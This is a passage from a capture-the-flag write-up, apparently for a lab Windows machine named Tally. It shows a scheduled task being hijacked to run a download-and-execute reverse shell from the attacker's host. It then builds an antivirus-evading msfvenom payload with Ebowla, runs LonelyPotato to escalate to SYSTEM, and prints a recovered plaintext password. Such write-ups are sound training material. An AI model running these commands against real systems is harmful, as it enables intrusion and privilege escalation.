            $global:msg += $error.Message + "`n" + $error.ItemName
            Write-EventLog -LogName Application -Source "SPBestWarmUp" -EntryType Warning -EventId $id -Message $global:msg
        }
    }
}

# Main
CreateLog
$cmdpath = (Resolve-Path .\).Path
$cmdpath += "\SPBestWarmUp.ps1"
$ver = $PSVersionTable.PSVersion
WriteLog "SPBestWarmUp v2.4.16  (last updated 2017-07-13)`n------`n"
WriteLog "Path: $cmdpath"
WriteLog "PowerShell Version: $ver"

# Check Permission Level
if (!$skipadmincheck -and !([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
	Write-Warning "You do not have elevated Administrator rights to run this script.`nPlease re-run as Administrator."
	break
} else {
    try {
        # SharePoint cmdlets
        Add-PSSnapin Microsoft.SharePoint.PowerShell -ErrorAction SilentlyContinue | Out-Null

        # Task Scheduler
        $tasks = schtasks /query /fo csv | ConvertFrom-Csv
        $spb = $tasks |Where-Object {$_.TaskName -eq "\SPBestWarmUp"}
        if (!$spb -and !$install -and !$installfarm) {
            Write-Warning "Tip: to install on Task Scheduler run the command ""SPBestWarmUp.ps1 -install"""
        }
        if ($install -or $installfarm -or $uninstall) {
            Installer
            SaveLog 2 "Installed to Task Scheduler"
        }
        if ($uninstall) {
            break
        }

        # Core
        ShowW3WP
        WarmUp
        ShowW3WP

		# Custom URLs - Add your own below
		# Looks at Central Admin Site Title to support many farms with a single script
		(Get-SPWebApplication -IncludeCentralAdministration) |Where-Object {$_.IsAdministrationWebApplication -eq $true} |ForEach-Object {
			$caTitle = Get-SPWeb $_.Url | Select-Object Title
		}
		switch -Wildcard ($caTitle) {
			"*PROD*" {
				#NavigateTo "http://portal/popularPage.aspx"
				#NavigateTo "http://portal/popularPage2.aspx"
				#NavigateTo "http://portal/popularPage3.aspx
			}
			"*TEST*" {
				#NavigateTo "http://portal/popularPage.aspx"
				#NavigateTo "http://portal/popularPage2.aspx"
				#NavigateTo "http://portal/popularPage3.aspx
			}
			default {
				#NavigateTo "http://portal/popularPage.aspx"
				#NavigateTo "http://portal/popularPage2.aspx"
				#NavigateTo "http://portal/popularPage3.aspx
			}
		}
		SaveLog 1 "Operation completed successfully"
	} catch {
		SaveLog 101 "ERROR" $_.Exception
	}
}
PS C:\Users\sarah\Desktop> cat SPBestWarmUp.xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <Repetition>
        <Interval>PT1H</Interval>
        <Duration>P1D</Duration>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>2017-01-25T01:00:00</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="System"&gt;&lt;Select Path="System"&gt;*[System[Provider[@Name='Microsoft-Windows-IIS-IISReset'] and EventID=3201]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
      <Delay>PT1M</Delay>
    </EventTrigger>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="System"&gt;&lt;Select Path="System"&gt;*[System[Provider[@Name='Microsoft-Windows-WAS'] and EventID=5074]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
      <Delay>PT1M</Delay>
    </EventTrigger>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="System"&gt;&lt;Select Path="System"&gt;*[System[Provider[@Name='Microsoft-Windows-WAS'] and EventID=5075]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
      <Delay>PT1M</Delay>
    </EventTrigger>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="System"&gt;&lt;Select Path="System"&gt;*[System[Provider[@Name='Microsoft-Windows-WAS'] and EventID=5076]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
      <Delay>PT1M</Delay>
    </EventTrigger>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="System"&gt;&lt;Select Path="System"&gt;*[System[Provider[@Name='Microsoft-Windows-WAS'] and EventID=5077]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
      <Delay>PT1M</Delay>
    </EventTrigger>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="System"&gt;&lt;Select Path="System"&gt;*[System[Provider[@Name='Microsoft-Windows-WAS'] and EventID=5078]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
      <Delay>PT1M</Delay>
    </EventTrigger>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="System"&gt;&lt;Select Path="System"&gt;*[System[Provider[@Name='Microsoft-Windows-WAS'] and EventID=5079]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
      <Delay>PT1M</Delay>
    </EventTrigger>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="System"&gt;&lt;Select Path="System"&gt;*[System[Provider[@Name='Microsoft-Windows-WAS'] and EventID=5080]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
    </EventTrigger>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="System"&gt;&lt;Select Path="System"&gt;*[System[Provider[@Name='Microsoft-Windows-WAS'] and EventID=5081]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
      <Delay>PT1M</Delay>
    </EventTrigger>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="System"&gt;&lt;Select Path="System"&gt;*[System[Provider[@Name='Microsoft-Windows-WAS'] and EventID=5117]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
      <Delay>PT1M</Delay>
    </EventTrigger>
    <EventTrigger>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="System"&gt;&lt;Select Path="System"&gt;*[System[Provider[@Name='Microsoft-Windows-WAS'] and EventID=5186]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
      <Delay>PT1M</Delay>
    </EventTrigger>
    <BootTrigger>
      <Enabled>true</Enabled>
      <Delay>PT5M</Delay>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>TALLY\Administrator</UserId>
      <LogonType>Password</LogonType>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>true</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>P3D</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>PowerShell.exe</Command>
      <Arguments>-ExecutionPolicy Bypass -File SPBestWarmUp.ps1 -skipadmincheck</Arguments>
      <WorkingDirectory>C:\Users\Sarah\Desktop</WorkingDirectory>
    </Exec>
  </Actions>
</Task>
PS C:\Users\sarah\Desktop> cat todo.txt
done:

install updates
check windows defender enabled

outstanding:

update intranet design
update server inventory


PS C:\Users\sarah\Desktop>
```

###### Reverse Shell 2 using scheduled task (SPBestWarmUp.ps1 and SPBestWarmUp.xml)

```sh
root@kali:~/tally/www# ls -l
total 20
-rw-r--r-- 1 root root 4403 May 31 17:48 rev-9001.ps1
-rw-r--r-- 1 root root 4403 May 31 18:18 rev-9002.ps1
root@kali:~/tally/www# tail rev-9002.ps1
        }
    }
    catch
    {
        Write-Warning "Something went wrong! Check if the server is reachable and you are using the correct port."
        Write-Error $_
    }
}

Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.16 -Port 9002
root@kali:~/tally/www#
```

```sh
PS C:\Users\sarah\Desktop> echo "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.16/rev-9002.ps1')" > SPBestWarmUp.ps1
PS C:\Users\sarah\Desktop> Get-Date

31 May 2018 23:24:04


PS C:\Users\sarah\Desktop> cat SPBestWarmUp.ps1
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.16/rev-9002.ps1')
PS C:\Users\sarah\Desktop>
```

```sh
root@kali:~/tally/www# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.59 - - [31/May/2018 18:04:55] "GET /rev-9001.ps1 HTTP/1.1" 200 -
10.10.10.59 - - [31/May/2018 18:29:36] "GET /PowerUp.ps1 HTTP/1.1" 200 -
10.10.10.59 - - [31/May/2018 19:01:14] "GET /rev-9002.ps1 HTTP/1.1" 200 -
```

```sh
root@kali:~/tally/www# nc -nlvp 9002
listening on [any] 9002 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.59] 51632
Windows PowerShell running as user Administrator on TALLY
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\Sarah\Desktop>dir


    Directory: C:\Users\Sarah\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       01/10/2017     22:32            916 browser.bat
-a----       17/09/2017     21:50            845 FTP.lnk
-a----       23/09/2017     21:11            297 note to tim (draft).txt
-a----       31/05/2018     23:24            164 SPBestWarmUp.ps1
-a----       19/10/2017     22:48          11010 SPBestWarmUp.xml
-a----       17/09/2017     21:48           1914 SQLCMD.lnk
-a----       21/09/2017     00:46            129 todo.txt
-ar---       31/08/2017     02:04             32 user.txt
-a----       17/09/2017     21:49            936 zz_Migration.lnk


PS C:\Users\Sarah\Desktop>
```

###### Privilege Escalation using LonelyPotato and AV Evasion

[`PowerSploit`](https://github.com/PowerShellMafia/PowerSploit)

```sh
root@kali:~/tally# git clone https://github.com/PowerShellMafia/PowerSploit -b dev
Cloning into 'PowerSploit'...
remote: Counting objects: 3079, done.
remote: Total 3079 (delta 0), reused 0 (delta 0), pack-reused 3079
Receiving objects: 100% (3079/3079), 10.41 MiB | 6.99 MiB/s, done.
Resolving deltas: 100% (1804/1804), done.
root@kali:~/tally# cd PowerSploit/
root@kali:~/tally/PowerSploit# ls
AntivirusBypass  docs          LICENSE  mkdocs.yml   PowerSploit.psd1  PowerSploit.pssproj  Privesc    Recon               Tests
CodeExecution    Exfiltration  Mayhem   Persistence  PowerSploit.psm1  PowerSploit.sln      README.md  ScriptModification
root@kali:~/tally/PowerSploit# cd Privesc/
root@kali:~/tally/PowerSploit/Privesc# ls
Get-System.ps1  PowerUp.ps1  Privesc.psd1  Privesc.psm1  README.md
root@kali:~/tally/PowerSploit/Privesc# cp PowerUp.ps1 ../../www/
root@kali:~/tally/PowerSploit/Privesc#
```

```sh
root@kali:~/tally/www# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.59 - - [31/May/2018 18:04:55] "GET /rev-9001.ps1 HTTP/1.1" 200 -
10.10.10.59 - - [31/May/2018 18:29:36] "GET /PowerUp.ps1 HTTP/1.1" 200 -
```

```sh
PS C:\Users\sarah\Desktop> IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.16/PowerUp.ps1')
PS C:\Users\sarah\Desktop> Invoke-AllChecks

Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
TokenHandle : 2164
ProcessId   : 11800
Name        : 11800
Check       : Process Token Privileges

ServiceName    : c2wts
Path           : C:\Program Files\Windows Identity Foundation\v3.5\c2wtshost.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'c2wts' -Path <HijackPath>
CanRestart     : False
Name           : c2wts
Check          : Unquoted Service Paths

ServiceName    : c2wts
Path           : C:\Program Files\Windows Identity Foundation\v3.5\c2wtshost.exe
ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=WriteData/AddFile}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'c2wts' -Path <HijackPath>
CanRestart     : False
Name           : c2wts
Check          : Unquoted Service Paths

ModifiablePath    : C:\Users\Sarah\AppData\Local\Microsoft\WindowsApps
IdentityReference : TALLY\Sarah
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\Sarah\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\Sarah\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\Sarah\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll'

DefaultDomainName    :
DefaultUserName      : sarah
DefaultPassword      : mylongandstrongp4ssword!
AltDefaultDomainName :
AltDefaultUserName   :
AltDefaultPassword   :
Check                : Registry Autologons

UnattendPath : C:\Windows\Panther\Unattend.xml
Name         : C:\Windows\Panther\Unattend.xml
Check        : Unattended Install Files



PS C:\Users\sarah\Desktop> Get-ChildItem : Access to the path 'C:\ProgramData\VMware\VMware Tools\GuestProxyData\trusted' is denied.
At line:4516 char:21
+ ... $XMlFiles = Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.x ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\ProgramData\...oxyData\trusted:String) [Get-ChildItem], Unauthoriz
   edAccessException
    + FullyQualifiedErrorId : DirUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetChildItemCommand

PS C:\Users\sarah\Desktop>
```

[`Potatoes and tokens`](https://decoder.cloud/2018/01/13/potato-and-tokens/)

[`lonelypotato`](https://github.com/decoder-it/lonelypotato)

```sh
root@kali:~/tally# git clone https://github.com/decoder-it/lonelypotato
Cloning into 'lonelypotato'...
remote: Counting objects: 46, done.
remote: Total 46 (delta 0), reused 0 (delta 0), pack-reused 46
Unpacking objects: 100% (46/46), done.
root@kali:~/tally# cd lonelypotato/
root@kali:~/tally/lonelypotato# ls -l
total 8
-rw-r--r-- 1 root root  574 May 31 18:43 README.md
drwxr-xr-x 3 root root 4096 May 31 18:43 RottenPotatoEXE
root@kali:~/tally/lonelypotato# cd RottenPotatoEXE/
root@kali:~/tally/lonelypotato/RottenPotatoEXE# ls -l
total 352
drwxr-xr-x 2 root root   4096 May 31 18:43 MSFRottenPotato
-rw-r--r-- 1 root root 348672 May 31 18:43 MSFRottenPotato.exe
-rw-r--r-- 1 root root   1375 May 31 18:43 MSFRottenPotato.sln
root@kali:~/tally/lonelypotato/RottenPotatoEXE#
root@kali:~/tally/lonelypotato/RottenPotatoEXE# cp MSFRottenPotato.exe ~/tally/www/lonelypotato.exe
```

[`Ebowla`](https://github.com/Genetic-Malware/Ebowla)

```sh
root@kali:~/tally# git clone https://github.com/Genetic-Malware/Ebowla.git
Cloning into 'Ebowla'...
remote: Counting objects: 545, done.
remote: Compressing objects: 100% (3/3), done.
remote: Total 545 (delta 0), reused 0 (delta 0), pack-reused 542
Receiving objects: 100% (545/545), 35.45 MiB | 7.46 MiB/s, done.
Resolving deltas: 100% (277/277), done.
root@kali:~/tally# cd Ebowla/
root@kali:~/tally/Ebowla# ls -l
total 18080
-rwxr-xr-x 1 root root      661 May 31 18:46 build_python.sh
-rwxr-xr-x 1 root root      997 May 31 18:46 build_x64_go.sh
-rwxr-xr-x 1 root root      976 May 31 18:46 build_x86_go.sh
-rw-r--r-- 1 root root     3448 May 31 18:46 cleanup.py
-rw-r--r-- 1 root root     3021 May 31 18:46 documentation.md
-rwxr-xr-x 1 root root     3455 May 31 18:46 ebowla.py
-rw-r--r-- 1 root root 10676111 May 31 18:46 Eko_2016_Morrow_Pitts_Master.pdf
drwxr-xr-x 2 root root     4096 May 31 18:46 encryption
-rw-r--r-- 1 root root      388 May 31 18:46 formats.md
-rw-r--r-- 1 root root     3925 May 31 18:46 genetic.config
-rw-r--r-- 1 root root  7778580 May 31 18:46 Infiltrate_2016_Morrow_Pitts_Genetic_Malware.pdf
-rw-r--r-- 1 root root     1739 May 31 18:46 LICENSE.md
drwxr-xr-x 7 root root     4096 May 31 18:46 MemoryModule
-rw-r--r-- 1 root root     2694 May 31 18:46 README.md
drwxr-xr-x 5 root root     4096 May 31 18:46 templates
root@kali:~/tally/Ebowla#
```

```sh
PS C:\Users\sarah\Desktop> hostname
TALLY
PS C:\Users\sarah\Desktop>
```

```sh
root@kali:~/tally/Ebowla# cat genetic.config
[Overall]

    # Options ENV, OTP

    Encryption_Type = ENV


    # Template output: GO, Python, OR PowerShell

    output_type = GO


    # Number of bytes subtracted from the reconstructed payload that will be the
    # sha512 checksum used when checking the file before executing the payload.

    minus_bytes = 1


    # type of file being fed (payload) - also determines execution
    # Python: EXE, DLL_x86, DLL_x64 are written to disk
    # GO: Nothing is written to disk
    # OPTIONS for GO: EXE, DLL_x86, DLL_x64, SHELLCODE
    # OPTIONS for PYTHON: EXE, SHELLCODE, CODE, FILE_DROP
    # OPTIONS for PowerShell: CODE, DLL_x86, DLL_x64, EXE, FILE_DROP

    payload_type = EXE


    # key_iterations is for otp_type = key and for symmetric_settings_win
    # It is the number of times that the key hash is iterated via sha512 before being used
    # as the encryption key.  NOT available to otp_type = full

    key_iterations = 10000

    # Clean the resulting loaders from comments and print statements
    # This will make the runs faster and not display status information on the victim host
    # Most useful once payloads have been tested and are ready for deployment
    # Values Bool: True or False

    clean_output = False


[otp_settings]
    # otp is simple, provide one time pad, type,  and starting search location
    # type is full otp to reconstruct the malware in memory, or an offset in the file for a symmetric key

    otp_type = key # OPTIONS: full, key


    # File for use with otp

    pad = 'cmd.exe'

    # Max pad size: Decide the largest pad size to use.
    # 256 ** 3 - 1 (16777215 or 0xffffff) maximum is supported
    # Too small might be a bad idea...

    pad_max = 0xffffff

    # starting location in the path to start looking if walking the path

    scan_dir = 'c:\windows\sysnative'#'%APPDATA%'


    # For use with FULL OTP:
    #  Number of max bytes for matching the payload against the OTP
    #  -- larger byte width equals possible smaller lookup table but longer build times

    byte_width = 9



[symmetric_settings_win]
    # AES-CFB-256 key from a combination of the any of the following settings.
    # Any of the following can be used, the more specific to your target the better.


    # set the value to '' if you do not want to use that value


    # This is not a permanent list.  Any env variable can be added below.
    # If you want the env variable to be used, give it a value.
    # These are case insensitive.

    [[ENV_VAR]]

        username = ''
        computername = 'TALLY'
        homepath = ''
        homedrive = ''
        Number_of_processors = ''
        processor_identifier = ''
        processor_revision = ''
        userdomain = ''
        systemdrive = ''
        userprofile = ''
        path = ''
        temp = ''


     [[PATH]]

    # Check if a path exists on the workstation
    # Only one path can be used.  This is immutable. To use, give it a value and a start location.

        # This is the path that will be used as part of the key

        path = ''

        # You can provide Env Variables that are associated with a path for the start_loc
        #  , such as %TEMP%, %APPDATA%, %PROGRAMFILES%
    # You Must use the %ENV VAR% when using env vars for paths!
    # Examples: C:\Windows, C:\Program Files, %APPDATA%

    start_loc = '%HOMEPATH%'


    [[IP_RANGES]]

    # Network mask for external enumeration 22.23.0.0
    # IP mask should not be used alone more simple to brute force.
    # Support for only 24 16 8 masks or exact ip
    # 12.12.0.0 or 12.12.12.12 or 12.12.0.0 or 12.0.0.0

    external_ip_mask = ''


    [[SYSTEM_TIME]]

    # Time Range with BEGING and END in EPOC
        # Should be used with another variable
    # This is a mask: 20161001 or 20161000 or 20160000
    # YEAR, MONTH, DAY

    Time_Range = ''


root@kali:~/tally/Ebowla#
```

```sh
root@kali:~/tally/Ebowla# python ebowla.py -h
Usage: ebowla.py input_file_to_encode config
root@kali:~/tally/Ebowla#
```

```sh
root@kali:~/tally/Ebowla# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.16 LPORT=9004 -f exe -a x64 -o shell9004.exe
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: shell9004.exe
root@kali:~/tally/Ebowla#
```

```sh
root@kali:~/tally/Ebowla# file shell9004.exe
shell9004.exe: PE32+ executable (GUI) x86-64, for MS Windows
root@kali:~/tally/Ebowla#
```

```sh
root@kali:~/tally/Ebowla# python ebowla.py shell9004.exe genetic.config
[*] Using Symmetric encryption
[*] Payload length 7168
[*] Payload_type exe
[*] Using EXE payload template
[*] Used environment variables:
	[-] environment value used: computername, value used: tally
[!] Path string not used as pasrt of key
[!] External IP mask NOT used as part of key
[!] System time mask NOT used as part of key
[*] String used to source the encryption key: tally
[*] Applying 10000 sha512 hash iterations before encryption
[*] Encryption key: 10ec761385e793a40f42f7906556ed3b159453df06bab23256c48f3b90de4834
[*] Writing GO payload to: go_symmetric_shell9004.exe.go
root@kali:~/tally/Ebowla#
```

```sh
root@kali:~/tally/Ebowla# cd output/
root@kali:~/tally/Ebowla/output# ls -l
total 20
-rw-r--r-- 1 root root 20223 May 31 18:55 go_symmetric_shell9004.exe.go
root@kali:~/tally/Ebowla/output# file go_symmetric_shell9004.exe.go
go_symmetric_shell9004.exe.go: C source, ASCII text, with very long lines
root@kali:~/tally/Ebowla/output#
```

```sh
root@kali:~/tally/Ebowla# ./build_x64_go.sh -h
Usage: ./build_x64_go.sh go_x86_script.go output.exe
root@kali:~/tally/Ebowla#
```

```sh
root@kali:~/tally/Ebowla# apt-cache search golang | grep language
root@kali:~/tally/Ebowla# apt install golang
```

```sh
root@kali:~# apt update && apt upgrade
root@kali:~# apt install mingw-w64
```

```sh
root@kali:~/tally/Ebowla# ./build_x64_go.sh output/go_symmetric_shell9004.exe.go ebowlashell9004.exe
[*] Copy Files to tmp for building
[*] Building...
[*] Building complete
[*] Copy ebowlashell9004.exe to output
[*] Cleaning up
[*] Done
root@kali:~/tally/Ebowla#
```

![](images/12.png)

![](images/13.png)

```sh
root@kali:~/tally/Ebowla# cp output/ebowlashell9004.exe ../
root@kali:~/tally/lonelypotato/RottenPotatoEXE# cp MSFRottenPotato.exe ../../lonelypotato.exe
```

```sh
root@kali:~/tally# ls -l ebowlashell9004.exe
-rwxr-xr-x 1 root root 2873282 May 31 19:29 ebowlashell9004.exe
root@kali:~/tally# ls -l lonelypotato.exe
-rw-r--r-- 1 root root 348672 May 31 19:33 lonelypotato.exe
root@kali:~/tally# chmod 755 lonelypotato.exe
root@kali:~/tally# ls -l lonelypotato.exe
-rwxr-xr-x 1 root root 348672 May 31 19:33 lonelypotato.exe
root@kali:~/tally#
```

```sh
root@kali:~/tally# ftp 10.10.10.59
Connected to 10.10.10.59.
220 Microsoft FTP Service
Name (10.10.10.59:root): ftp_user
331 Password required
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
150 Opening ASCII mode data connection.
08-31-17  11:51PM       <DIR>          From-Custodian
05-30-18  09:15PM       <DIR>          Intranet
08-28-17  06:56PM       <DIR>          Logs
09-15-17  09:30PM       <DIR>          To-Upload
09-17-17  09:27PM       <DIR>          User
226 Transfer complete.
ftp> cd Intranet
250 CWD command successful.
ftp> put lonelypotato.exe
local: lonelypotato.exe remote: lonelypotato.exe
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
349485 bytes sent in 2.46 secs (138.8080 kB/s)
ftp>
ftp> put ebowlashell9004.exe
local: ebowlashell9004.exe remote: ebowlashell9004.exe
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2873282 bytes sent in 18.65 secs (150.4292 kB/s)
ftp>
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
09-11-17  10:25PM       <DIR>          Binaries
06-01-18  12:31AM              2873282 ebowlashell9004.exe
06-01-18  12:34AM               349485 lonelypotato.exe
226 Transfer complete.
ftp>
```

```sh
PS C:\Users\sarah\Desktop> cd C:\FTP
PS C:\FTP> dir


    Directory: C:\FTP


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       31/08/2017     23:51                From-Custodian
d-----       01/06/2018     00:34                Intranet
d-----       28/08/2017     18:56                Logs
d-----       15/09/2017     21:30                To-Upload
d-----       17/09/2017     21:27                User


PS C:\FTP> cd Intranet
PS C:\FTP\Intranet> dir


    Directory: C:\FTP\Intranet


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       11/09/2017     22:25                Binaries
-a----       01/06/2018     00:31        2873282 ebowlashell9004.exe
-a----       01/06/2018     00:34         349485 lonelypotato.exe


PS C:\FTP\Intranet>
PS C:\FTP\Intranet> C:\FTP\Intranet\lonelypotato.exe * ebowlashell9004.exe
connect sock
CreateIlok: 0 0
CreateDoc: 0 0
start RPC  connection
COM -> bytes received: 116
RPC -> bytes Sent: 116
RPC -> bytes received: 84
COM -> bytes sent: 84
COM -> bytes received: 24
RPC -> bytes Sent: 24
RPC -> bytes received: 200
COM -> bytes sent: 200
COM -> bytes received: 134
RPC -> bytes Sent: 134
RPC -> bytes received: 206
COM -> bytes sent: 206
COM -> bytes received: 250
RPC -> bytes Sent: 250
RPC -> bytes received: 202
COM -> bytes sent: 202
COM -> bytes received: 72
RPC -> bytes Sent: 72
RPC -> bytes received: 60
COM -> bytes sent: 60
COM -> bytes received: 42
RPC -> bytes Sent: 42
RPC -> bytes received: 56
COM -> bytes sent: 56
CoGet: -2147022986 0
[+] authresult != -1
[+] Elevated Token tye:2
[+] DuplicateTokenEx :1  0
[+] Duped Token type:1
[+] Running ebowlashell9004.exe sessionId 1
[+] CreateProcessWithTokenW OK
Auth result: 0
Return code: 0
Last error: 0
PS C:\FTP\Intranet>
```

```sh
root@kali:~/tally# nc -nlvp 9004
listening on [any] 9004 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.10.59] 51836
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>cd C:\
cd C:\

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8EB3-6DCB

 Directory of C:\

09/18/2017  06:58 AM    <DIR>          ACCT
09/18/2017  09:35 PM    <DIR>          FTP
09/18/2017  10:35 PM    <DIR>          inetpub
07/16/2016  02:23 PM    <DIR>          PerfLogs
12/24/2017  02:46 AM    <DIR>          Program Files
10/19/2017  11:09 PM    <DIR>          Program Files (x86)
10/01/2017  08:46 PM    <DIR>          TEMP
10/12/2017  09:28 PM    <DIR>          Users
10/23/2017  09:44 PM    <DIR>          Windows
               0 File(s)              0 bytes
               9 Dir(s)   1,864,118,272 bytes free

C:\>cd Users
cd Users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8EB3-6DCB

 Directory of C:\Users

10/12/2017  09:28 PM    <DIR>          .
10/12/2017  09:28 PM    <DIR>          ..
09/18/2017  10:35 PM    <DIR>          .NET v2.0
09/18/2017  10:35 PM    <DIR>          .NET v2.0 Classic
08/30/2017  01:14 AM    <DIR>          .NET v4.5
08/30/2017  01:14 AM    <DIR>          .NET v4.5 Classic
09/17/2017  09:33 PM    <DIR>          Administrator
09/18/2017  10:35 PM    <DIR>          Classic .NET AppPool
11/21/2016  02:24 AM    <DIR>          Public
10/13/2017  11:57 PM    <DIR>          Sarah
10/12/2017  09:28 PM    <DIR>          SQLSERVERAGENT
09/02/2017  10:46 PM    <DIR>          SQLTELEMETRY
09/13/2017  09:27 PM    <DIR>          Tim
               0 File(s)              0 bytes
              13 Dir(s)   1,864,048,640 bytes free

C:\Users>cd Administrator
cd Administrator

C:\Users\Administrator>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8EB3-6DCB

 Directory of C:\Users\Administrator

09/17/2017  09:33 PM    <DIR>          .
09/17/2017  09:33 PM    <DIR>          ..
08/31/2017  01:20 AM    <DIR>          .idlerc
08/30/2017  07:17 AM    <DIR>          Contacts
10/19/2017  10:45 PM    <DIR>          Desktop
08/30/2017  01:39 PM    <DIR>          Documents
10/15/2017  11:39 PM    <DIR>          Downloads
08/30/2017  07:17 AM    <DIR>          Favorites
08/30/2017  07:17 AM    <DIR>          Links
08/30/2017  07:17 AM    <DIR>          Music
08/30/2017  07:17 AM    <DIR>          Pictures
08/30/2017  07:17 AM    <DIR>          Saved Games
08/30/2017  07:17 AM    <DIR>          Searches
08/30/2017  07:17 AM    <DIR>          Videos
09/02/2017  10:55 PM    <DIR>          WINDOWS
               0 File(s)              0 bytes
              15 Dir(s)   1,864,044,544 bytes free

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8EB3-6DCB

 Directory of C:\Users\Administrator\Desktop

